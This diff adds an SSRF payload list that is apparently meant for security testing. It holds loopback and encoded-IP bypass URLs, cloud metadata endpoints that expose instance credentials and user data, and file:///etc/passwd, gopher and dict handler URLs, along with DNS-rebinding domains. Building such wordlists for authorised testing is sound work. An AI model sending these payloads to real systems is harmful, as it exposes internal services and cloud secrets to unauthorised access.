@@ -1,0 +1,36 @@
+# SSRF Payloads
+# Internal IP addresses
+http://127.0.0.1:80
+http://127.0.0.1:8080
+http://127.0.0.1:22
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://2130706433
+http://017700000001
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+
+# Protocol handlers
+file:///etc/passwd
+ftp://127.0.0.1
+gopher://127.0.0.1:80/_GET
+dict://127.0.0.1:11211/
+ldap://127.0.0.1
+sftp://127.0.0.1
+
+# DNS rebinding
+http://localtest.me
+http://lvh.me
+http://nip.io
+http://xip.io
+
+# Bypass attempts
+http://127.1
+http://0x7f.0x0.0x0.0x1
+http://2130706433
+http://127.000.000.001
